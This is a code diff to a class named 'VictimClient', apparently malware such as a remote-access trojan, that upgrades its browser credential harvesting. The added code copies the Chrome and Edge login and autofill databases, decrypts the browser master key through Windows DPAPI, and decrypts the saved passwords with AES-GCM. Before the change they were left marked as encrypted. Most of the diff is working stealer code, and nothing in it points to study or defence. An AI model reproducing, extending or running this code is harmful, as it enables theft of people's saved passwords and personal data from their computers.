@@ -139,7 +139,7 @@ class VictimClient:
                     screenshot = sct.grab(monitor)
                     import io
                     from PIL import Image
-                    img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
+                    img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
                     buf = io.BytesIO()
                     img.save(buf, format="JPEG", quality=50)
                     frame_data = buf.getvalue()
@@ -217,29 +217,101 @@ class VictimClient:
         return passwords
 
     def _get_browser_creds(self) -> dict:
-        creds = {"chrome": [], "firefox": []}
+        creds = {"chrome": [], "edge": [], "autofill": []}
         try:
             if platform.system() == "Windows":
-                chrome_path = os.path.expandvars(
-                    r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"
-                )
+                import sqlite3
+                import shutil
+                import json
+                import base64
+
+                def _decrypt_chrome_password(encrypted_password: bytes, local_state_path: str) -> str:
+                    try:
+                        with open(local_state_path, "r", encoding="utf-8") as f:
+                            local_state = json.load(f)
+                        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+                        encrypted_key = encrypted_key[5:]
+                        import ctypes
+                        import ctypes.wintypes
+
+                        class DATA_BLOB(ctypes.Structure):
+                            _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
+
+                        blob_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key, len(encrypted_key)))
+                        blob_out = DATA_BLOB()
+                        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
+                            aes_key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
+                            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
+                        else:
+                            return "[decryption failed]"
+                        if encrypted_password[:3] == b"v10":
+                            nonce = encrypted_password[3:15]
+                            ciphertext = encrypted_password[15:-16]
+                            tag = encrypted_password[-16:]
+                            from Crypto.Cipher import AES
+                            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
+                            return cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8", errors="replace")
+                        return "[unsupported format]"
+                    except Exception:
+                        return "[decryption failed]"
+
+                def _read_browser_logins(browser_name: str, user_data_path: str, profile: str = "Default"):
+                    logins = []
+                    login_db = os.path.join(user_data_path, profile, "Login Data")
+                    local_state = os.path.join(user_data_path, "Local State")
+                    if not os.path.exists(login_db):
+                        return logins
+                    temp_path = login_db + ".tmp"
+                    try:
+                        shutil.copy2(login_db, temp_path)
+                        conn = sqlite3.connect(temp_path)
+                        cursor = conn.execute("SELECT origin_url, username_value, password_value FROM logins")
+                        for row in cursor:
+                            password = "[encrypted]"
+                            if row[2]:
+                                password = _decrypt_chrome_password(row[2], local_state)
+                            logins.append({"url": row[0], "username": row[1], "password": password})
+                        conn.close()
+                        os.remove(temp_path)
+                    except Exception:
+                        try:
+                            os.remove(temp_path)
+                        except Exception:
+                            pass
+                    return logins
+
+                def _read_autofill(user_data_path: str, profile: str = "Default"):
+                    entries = []
+                    web_data = os.path.join(user_data_path, profile, "Web Data")
+                    if not os.path.exists(web_data):
+                        return entries
+                    temp_path = web_data + ".tmp"
+                    try:
+                        shutil.copy2(web_data, temp_path)
+                        conn = sqlite3.connect(temp_path)
+                        cursor = conn.execute("SELECT name, value FROM autofill")
+                        for row in cursor:
+                            if row[0] and row[1]:
+                                entries.append({"field": row[0], "value": row[1]})
+                        conn.close()
+                        os.remove(temp_path)
+                    except Exception:
+                        try:
+                            os.remove(temp_path)
+                        except Exception:
+                            pass
+                    return entries
+
+                chrome_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
                 if os.path.exists(chrome_path):
-                    import sqlite3
-                    import shutil
-                    temp_path = chrome_path + ".tmp"
-                    shutil.copy2(chrome_path, temp_path)
-                    conn = sqlite3.connect(temp_path)
-                    cursor = conn.execute(
-                        "SELECT origin_url, username_value, password_value FROM logins"
-                    )
-                    for row in cursor:
-                        creds["chrome"].append({
-                            "url": row[0],
-                            "username": row[1],
-                            "password": "[encrypted]",
-                        })
-                    conn.close()
-                    os.remove(temp_path)
+                    creds["chrome"] = _read_browser_logins("chrome", chrome_path, "Default")
+                    creds["autofill"] = _read_autofill(chrome_path, "Default")
+
+                edge_path = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")
+                if os.path.exists(edge_path):
+                    creds["edge"] = _read_browser_logins("edge", edge_path, "Default")
+                    if not creds["autofill"]:
+                        creds["autofill"] = _read_autofill(edge_path, "Default")
         except Exception as e:
             creds["_error"] = str(e)
         return creds
